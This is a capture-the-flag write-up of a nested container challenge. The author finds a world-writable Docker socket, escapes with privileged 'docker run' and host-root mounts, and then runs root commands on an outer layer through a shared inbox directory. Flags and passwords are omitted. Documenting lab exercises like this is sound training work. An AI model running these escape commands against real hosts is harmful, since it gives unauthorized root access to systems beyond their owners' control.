## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Can you escape the Matryoshka Containment Unit?
## Matryoshka Containment Unit
You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.
Your memory is fuzzy, and you don't remember much about how you set it up.
Good luck!
```
## IP-Address
```IP-Address
10.49.150.116
```
### SSH Login
```bash
Username            :          matryoshka
Password            :          [password omitted]
IP address          :          10.49.150.116
Connection via      :          SSH
```
- Login
```bash
$ ssh matryoshka@10.49.150.116
[*] You are in the Matryoshka Containment Unit. Escape is futile.
c52a2720a741:~$ sudo -l
bash: sudo: command not found

c52a2720a741:~$ ls -la
drwxr-sr-x 2 matryoshka matryoshka 4096 May  4 14:25 .
drwxr-xr-x 3 root       root       4096 May  4 14:25 ..
-rw-r--r-- 1 matryoshka matryoshka   73 May  4 14:25 .bashrc

c52a2720a741:~$ cat .bashrc
echo "[*] You are in the Matryoshka Containment Unit. Escape is futile."
```
### Enumeration
```bash
c52a2720a741:~$ pwd
/home/matryoshka
c52a2720a741:~$ cd ..
c52a2720a741:/home$ ls
matryoshka
c52a2720a741:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
matryoshka:x:1000:1000:Linux User,,,:/home/matryoshka:/bin/sh
c52a2720a741:/home$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```
- Look For Finding `Readable`/`Writable Files` or `Flag`
```bash
c52a2720a741:/home$ find / -perm -4000 -type f 2>/dev/null
c52a2720a741:/home$ find /home/ -type f -writable 2>/dev/null
c52a2720a741:/home$ find / -type f -iname "*flag*" 2>/dev/null
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/conf/all/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/default/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/lo/ra_honor_pio_pflag
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/bash/fdflags
```
- Got Something `fdflags`
```bash
c52a2720a741:/home$ cat /usr/lib/bash/fdflags
<Binary>
strings /usr/lib/bash/fdflags
(0Ec
_init
_fini
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
__deregister_frame_info
__register_frame_info
fcntl
__errno_location
strerror
builtin_error
printf
putchar
fdflags_builtin
reset_internal_getopt
builtin_help
list_optarg
builtin_usage
loptend
getdtablesize
legal_number
strtok
strcmp
__stack_chk_fail
fdflags_struct
fdflags_doc
libc.musl-x86_64.so.1
fdflags
uGUH
t&UH
[]A\
AWAVAUATA
[]A\A]A^A_
[]A\A]A^A_
AWAVE1
AUATUH
D$81
D$0H
t$0H
L$,<-u
L$$L
l$(A
D$8dH+
[]A\A]A^A_
can't get status for fd %d: %s
Can't get flags for fd %d: %s
%s%s
%s: invalid file descriptor
invalid flag `%s'
can't set status for fd %d: %s
can't set flags for fd %d: %s
fdflags
fdflags [-v] [-s flags_string] [fd ...]
Display and modify file descriptor flags.
Display or, if the -s option is supplied, set flags for each file
descriptor supplied as an argument.  If the -v option is supplied,
the display is verbose, including each settable option name in the
form of a string such as that accepted by the -s option.
The -s option accepts a string with a list of flag names, each preceded
by a `+' (set) or `-' (unset).  Those changes are applied to each file
descriptor supplied as an argument.
If no file descriptor arguments are supplied, the displayed information
consists of the status of flags for each of the shell's open files.
append
async
nonblock
dsync
rsync
direct
noatime
cloexec
fdflags.debug
.shstrtab
.note.gnu.property
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.rela.dyn
.relr.dyn
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got
.data
.bss
.gnu_debuglink
```
- Look for fdflags -version
```bash
$ ps aux
PID   USER     TIME  COMMAND
    1 matryosh  0:00 sleep infinity
    7 matryosh  0:00 /bin/bash
   24 matryosh  0:00 ps aux
c52a2720a741:/home$ ls -la /proc/self/fd
dr-x------ 2 matryoshka matryoshka  4 May  8 22:52 .
dr-xr-xr-x 9 matryoshka matryoshka  0 May  8 22:52 ..
lrwx------ 1 matryoshka matryoshka 64 May  8 22:52 0 -> /dev/pts/0
lrwx------ 1 matryoshka matryoshka 64 May  8 22:52 1 -> /dev/pts/0
lrwx------ 1 matryoshka matryoshka 64 May  8 22:52 2 -> /dev/pts/0
lr-x------ 1 matryoshka matryoshka 64 May  8 22:52 3 -> /proc/28/fd
c52a2720a741:/home$ /usr/lib/bash/fdflags -v
Segmentation fault (core dumped)
c52a2720a741:/home$ mount
/dev/root on / type ext4 (rw,relatime,discard)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard)
/dev/root on /etc/hostname type ext4 (rw,relatime,discard)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard)

c52a2720a741:/home$ cat /proc/1/mountinfo
564 517 259:1 /var/lib/docker/volumes/a0ce533d826dafc966e575f185f139ae1047ea23b09c907475eef3b8e09280b2/_data/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/da711eeb314349695bd5778b90c1d6ce9dca3476fef16b237210834443af3869 / rw,relatime master:296 - ext4 /dev/root rw,discard
566 564 0:69 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
567 564 0:70 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
568 567 0:71 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
569 564 0:72 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
570 569 0:29 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
571 567 0:68 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
572 567 0:73 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
573 564 259:1 /var/lib/docker/volumes/a0ce533d826dafc966e575f185f139ae1047ea23b09c907475eef3b8e09280b2/_data/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/containers/c52a2720a7413232f345c44b79087fe120e6941f886df4bf2199ffe81eeb9928/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard
574 564 259:1 /var/lib/docker/volumes/a0ce533d826dafc966e575f185f139ae1047ea23b09c907475eef3b8e09280b2/_data/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/containers/c52a2720a7413232f345c44b79087fe120e6941f886df4bf2199ffe81eeb9928/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard
575 564 259:1 /var/lib/docker/volumes/a0ce533d826dafc966e575f185f139ae1047ea23b09c907475eef3b8e09280b2/_data/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/containers/c52a2720a7413232f345c44b79087fe120e6941f886df4bf2199ffe81eeb9928/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard
576 564 0:44 /run/docker.sock /run/docker.sock rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/Q2QK4XZJOMK2VPNGRIFJBXOKB4:/var/lib/docker/overlay2/l/UCWBLPLBAPF5I5LK4GIDJ3SEY2:/var/lib/docker/overlay2/l/DIH6PQBXLUFDQ7DBV5FSXOOQCA:/var/lib/docker/overlay2/l/GPQRDJ5WC5ZI64IWRUIDLO3UZV:/var/lib/docker/overlay2/l/UHJQ2X354XRUPAEEHCBPULLJ3A:/var/lib/docker/overlay2/l/HXIKNRDIRSFXCBCNV4C6D234CX:/var/lib/docker/overlay2/l/SLTWQSPCVILYLJJPNA2ZXIODI3:/var/lib/docker/overlay2/l/3ZD6A72J3MWAQK6LNBO7IZQJVC:/var/lib/docker/overlay2/l/KZPUMK7AUMNF4AHEVMBGIAMTPJ:/var/lib/docker/overlay2/l/D7ICJAAWV22MEOVT5SKY5NABFL:/var/lib/docker/overlay2/l/XNHRSE3LX4F5DDXIAYPQ6GF6SQ:/var/lib/docker/overlay2/l/266VGKCBLNLY5SVRWR3P6Z3SS2:/var/lib/docker/overlay2/l/5ZSJNNPO6ZSW5QCPA4DSU5UXAN:/var/lib/docker/overlay2/l/D7M4HX6TEX4GDZET2RBDMB7GXD:/var/lib/docker/overlay2/l/TSEDHOMJIBNLEYOZPMKYVRDS3D:/var/lib/docker/overlay2/l/STCF5URXUFJFXBCU35D2U2XRZ7:/var/lib/docker/overlay2/l/MBNJMCRTGJIXWCJNVGV3BJNXRY:/var/lib/docker/overlay2/l/JKPCIE5IJBIONTTVC245ZM4HYZ:/var/lib/docker/overlay2/l/4SCTQODTNFBSDRO2XUNUBKRDQ2:/var/lib/docker/overlay2/l/TW4OXTHOKYATQG2HQGRU5PZLZL:/var/lib/docker/overlay2/l/BPWIDN2GMB3JMIJFINGXXQECAW:/var/lib/docker/overlay2/l/X4NASVOJHM6RPGRTBGMLJUVVMX,upperdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/diff,workdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/work,nouserxattr
533 566 0:69 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
534 566 0:69 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
535 566 0:69 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
536 566 0:69 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
537 566 0:69 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
538 566 0:74 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
539 566 0:70 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
540 566 0:70 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
541 566 0:70 /null /proc/latency_stats rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
543 566 0:70 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
544 566 0:75 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64
545 569 0:76 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64

c52a2720a741:/home$ cat /proc/self/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000


c52a2720a741:/home$ find / -type s 2>/dev/null
/run/docker.sock
c52a2720a741:/home$ find / -name docker.sock 2>/dev/null
/run/docker.sock

c52a2720a741:/proc/1/root$ cd /proc/1/root && pwd && ls -la /home/matryoshka
/proc/1/root
total 12
drwxr-sr-x 2 matryoshka matryoshka 4096 May  4 14:25 .
drwxr-xr-x 3 root       root       4096 May  4 14:25 ..
-rw-r--r-- 1 matryoshka matryoshka   73 May  4 14:25 .bashrc
c52a2720a741:/proc/1/root$ cd /proc/1/root && pwd && ls -la /root/
/proc/1/root
ls: cannot open directory '/root/': Permission denied
c52a2720a741:/proc/1/root$ ls -la /run/docker.sock
srw-rw-rw- 1 root 2375 0 May  8 22:45 /run/docker.sock
c52a2720a741:/proc/1/root$ which curl
c52a2720a741:/proc/1/root$ which docker
/usr/bin/docker
c52a2720a741:/proc/1/root$ docker ps
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS     NAMES
c52a2720a741   matryoshka-level1:local   "sh -lc 'sleep infin…"   13 minutes ago   Up 13 minutes             level1
c52a2720a741:/proc/1/root$ docker run -it --rm -v /:/host alpine chroot /host sh
Unable to find image 'alpine:latest' locally
^C
c52a2720a741:/proc/1/root$ docker run --rm -v /:/host alpine cat /host/root/flag.txt
Unable to find image 'alpine:latest' locally
```
----
## Docker Exploitation
```bash
c52a2720a741:/proc/1/root$ docker run --rm -u 0 -v /:/host matryoshka-level1:local id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
c52a2720a741:/proc/1/root$ docker run --rm -u 0 -v /:/host matryoshka-level1:local ls -la /host/root
total 12
drwx------ 1 root root 4096 May  8 22:45 .
drwxr-xr-x 1 root root 4096 May  8 22:45 ..
-r-------- 1 root root   20 May  8 22:45 flag_level2.txt
c52a2720a741:/proc/1/root$ docker run --rm -u 0 -v /:/host matryoshka-level1:local cat  /host/root/flag_level2.txt
[flag omitted]
c52a2720a741:/proc/1/root$
```
- Docker Escape
```bash
c52a2720a741:/proc/1/root$ docker run -it --rm \
--privileged \
--pid=host \
--net=host \
--ipc=host \
--uts=host \
-v /:/outer \
alpine:3.20 sh
# whoami
root
# ls -la
total 12
drwxr-sr-x 2 matryoshka matryoshka 4096 May  4 14:25 .
drwxr-xr-x 3 root       root       4096 May  4 14:25 ..
-rw-r--r-- 1 matryoshka matryoshka   73 May  4 14:25 .bashrc
/home/matryoshka # cd /root
~ # ls -la
total 12
drwx------  2 root root 4096 May  8 23:07 .
drwxr-xr-x 20 root root 4096 May  8 23:07 ..
-rw-------  1 root root   36 May  8 23:07 .ash_history
~ # pwd
/root
~ # ls /host/root
flag_level2.txt
~ # chroot /host sh
/ # whoami
root
```
## Level 2
```bash
/ # hostname
613a37677f10
# docker ps -a
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS     NAMES
ab56057d00dd   matryoshka-level1:local   "sh"                     3 minutes ago    Up 3 minutes              nostalgic_ardinghelli
c52a2720a741   matryoshka-level1:local   "sh -lc 'sleep infin…"   26 minutes ago   Up 26 minutes             level1

 # docker images
REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
matryoshka-level1   local     485e908211ec   4 days ago    43.9MB
alpine              3.20      bf8527eb54c3   3 weeks ago   7.8MB
```
- Got the Docker Level-2 Foothold
```bash
# mount | grep overlay
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/Q2QK4XZJOMK2VPNGRIFJBXOKB4:/var/lib/docker/overlay2/l/UCWBLPLBAPF5I5LK4GIDJ3SEY2:/var/lib/docker/overlay2/l/DIH6PQBXLUFDQ7DBV5FSXOOQCA:/var/lib/docker/overlay2/l/GPQRDJ5WC5ZI64IWRUIDLO3UZV:/var/lib/docker/overlay2/l/UHJQ2X354XRUPAEEHCBPULLJ3A:/var/lib/docker/overlay2/l/HXIKNRDIRSFXCBCNV4C6D234CX:/var/lib/docker/overlay2/l/SLTWQSPCVILYLJJPNA2ZXIODI3:/var/lib/docker/overlay2/l/3ZD6A72J3MWAQK6LNBO7IZQJVC:/var/lib/docker/overlay2/l/KZPUMK7AUMNF4AHEVMBGIAMTPJ:/var/lib/docker/overlay2/l/D7ICJAAWV22MEOVT5SKY5NABFL:/var/lib/docker/overlay2/l/XNHRSE3LX4F5DDXIAYPQ6GF6SQ:/var/lib/docker/overlay2/l/266VGKCBLNLY5SVRWR3P6Z3SS2:/var/lib/docker/overlay2/l/5ZSJNNPO6ZSW5QCPA4DSU5UXAN:/var/lib/docker/overlay2/l/D7M4HX6TEX4GDZET2RBDMB7GXD:/var/lib/docker/overlay2/l/TSEDHOMJIBNLEYOZPMKYVRDS3D:/var/lib/docker/overlay2/l/STCF5URXUFJFXBCU35D2U2XRZ7:/var/lib/docker/overlay2/l/MBNJMCRTGJIXWCJNVGV3BJNXRY:/var/lib/docker/overlay2/l/JKPCIE5IJBIONTTVC245ZM4HYZ:/var/lib/docker/overlay2/l/4SCTQODTNFBSDRO2XUNUBKRDQ2:/var/lib/docker/overlay2/l/TW4OXTHOKYATQG2HQGRU5PZLZL:/var/lib/docker/overlay2/l/BPWIDN2GMB3JMIJFINGXXQECAW:/var/lib/docker/overlay2/l/X4NASVOJHM6RPGRTBGMLJUVVMX,upperdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/diff,workdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/work,nouserxattr)
overlay on /mnt/level3share type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/202/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/179/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/175/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/171/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/work,nouserxattr)
```
- Mount Discovered the Directory `inbox`/`Outbox`
```bash
# ls -la /mnt/level3share
total 16
drwxrwxrwx 4 root root 4096 May  8 22:44 .
drwxr-xr-x 1 root root 4096 May  8 22:45 ..
drwxrwxrwx 2 root root 4096 May  8 22:44 inbox
drwxrwxrwx 2 root root 4096 May  8 22:44 outbox
```
- Writeable Pemission
```bash
# echo 'id' > /mnt/level3share/inbox/cmd.sh
ls -la /mnt/level3share/outbox
drwxrwxrwx 2 root root 4096 May  8 23:24 .
drwxrwxrwx 4 root root 4096 May  8 22:44 ..
-rw-r--r-- 1 root root  130 May  8 23:24 cmd.sh.out
/ # cat /mnt/level3share/outbox/cmd.sh.out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
- Discover the Outer Layer
```bash
cat > /mnt/level3share/inbox/recon.sh << 'EOF'
> #!/bin/sh
> echo "=== WHOAMI ==="
> whoami
> echo "=== HOSTNAME ==="
> hostname
> echo "=== ID ==="
> id
> echo "=== CGROUP ==="
> cat /proc/1/cgroup
> echo "=== MOUNTS ==="
> mount
> echo "=== FLAGS ==="
> find / -iname "*flag*" 2>/dev/null
> EOF
```
- Outbox Result
```bash
cat /mnt/level3share/outbox/recon.sh.out
=== WHOAMI ===
root
=== HOSTNAME ===
985f8e64df71
=== ID ===
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
=== CGROUP ===
0::/../../init.scope
=== MOUNTS ===
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/202/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/179/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/175/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/171/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/work,nouserxattr)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/nvme0n1p1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
/dev/nvme0n1p1 on /etc/hostname type ext4 (rw,relatime,discard)
/dev/nvme0n1p1 on /etc/hosts type ext4 (rw,relatime,discard)
/dev/nvme0n1p1 on /var/lib/docker type ext4 (rw,relatime,discard)
none on /sys/kernel/security type securityfs (rw,relatime)
none on /tmp type tmpfs (rw,relatime,inode64)
overlay on /var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/merged type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/Q2QK4XZJOMK2VPNGRIFJBXOKB4:/var/lib/docker/overlay2/l/UCWBLPLBAPF5I5LK4GIDJ3SEY2:/var/lib/docker/overlay2/l/DIH6PQBXLUFDQ7DBV5FSXOOQCA:/var/lib/docker/overlay2/l/GPQRDJ5WC5ZI64IWRUIDLO3UZV:/var/lib/docker/overlay2/l/UHJQ2X354XRUPAEEHCBPULLJ3A:/var/lib/docker/overlay2/l/HXIKNRDIRSFXCBCNV4C6D234CX:/var/lib/docker/overlay2/l/SLTWQSPCVILYLJJPNA2ZXIODI3:/var/lib/docker/overlay2/l/3ZD6A72J3MWAQK6LNBO7IZQJVC:/var/lib/docker/overlay2/l/KZPUMK7AUMNF4AHEVMBGIAMTPJ:/var/lib/docker/overlay2/l/D7ICJAAWV22MEOVT5SKY5NABFL:/var/lib/docker/overlay2/l/XNHRSE3LX4F5DDXIAYPQ6GF6SQ:/var/lib/docker/overlay2/l/266VGKCBLNLY5SVRWR3P6Z3SS2:/var/lib/docker/overlay2/l/5ZSJNNPO6ZSW5QCPA4DSU5UXAN:/var/lib/docker/overlay2/l/D7M4HX6TEX4GDZET2RBDMB7GXD:/var/lib/docker/overlay2/l/TSEDHOMJIBNLEYOZPMKYVRDS3D:/var/lib/docker/overlay2/l/STCF5URXUFJFXBCU35D2U2XRZ7:/var/lib/docker/overlay2/l/MBNJMCRTGJIXWCJNVGV3BJNXRY:/var/lib/docker/overlay2/l/JKPCIE5IJBIONTTVC245ZM4HYZ:/var/lib/docker/overlay2/l/4SCTQODTNFBSDRO2XUNUBKRDQ2:/var/lib/docker/overlay2/l/TW4OXTHOKYATQG2HQGRU5PZLZL:/var/lib/docker/overlay2/l/BPWIDN2GMB3JMIJFINGXXQECAW:/var/lib/docker/overlay2/l/X4NASVOJHM6RPGRTBGMLJUVVMX,upperdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/diff,workdir=/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/work,nouserxattr)
nsfs on /run/docker/netns/c3638405d777 type nsfs (rw)
=== FLAGS ===
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/docker0/flags
/sys/devices/virtual/net/vethf2dbda3/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/conf/all/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/default/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/docker0/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/eth0/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/lo/ra_honor_pio_pflag
/proc/sys/net/ipv6/conf/vethf2dbda3/ra_honor_pio_pflag
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/root/flag_level3.txt
/usr/lib/bash/fdflags
/var/lib/docker/overlay2/9f3dd7cb2bcd1dc43b7f6f58d95ea80178676107cecb0af191e3a22cdb0d7616/diff/usr/lib/bash/fdflags
/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/merged/root/flag_level2.txt
/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/merged/usr/lib/bash/fdflags
/var/lib/docker/overlay2/7db3dc92bf787e9b60ef58f691831227665a1feba3514fe59a0e819cc488edc1/diff/root/flag_level2.txt
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/69154642242f0f50e603b511738e2bcc9758568fd6eb9cee5c046a8725b977cc/usr/lib/bash/fdflags
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/f25b5f8a9f1a37cc9fb16d0e617a14cc38c3c4c7a285d86026c7b845af315a75/usr/lib/bash/fdflags
